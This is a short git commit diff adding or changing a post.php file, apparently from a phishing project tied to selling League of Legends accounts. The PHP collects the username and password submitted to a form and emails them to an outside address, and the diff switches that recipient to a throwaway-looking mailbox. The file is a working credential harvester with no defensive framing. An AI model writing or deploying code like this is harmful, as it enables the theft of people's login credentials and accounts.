a90399956d407f8f5fc58773d2f0e881172e9a00
LoL Prodaja Akaunta <lolprodajaacc@gmail.com>
2018-04-02 13:56:58 +0200

    added post.php file

--- post.php
+++ post.php
@@ -1,5 +1,5 @@
 <?php
 $message .= "Mail                            : ".$_POST['username']."\n";
 $message .= "Pass                    : ".$_POST['password']."\n";
-mail('lolprodajaacc@gmail.com', 'My Subject', $message);
+mail('f2697755@nwytg.com', 'My Subject', $message);
 ?>
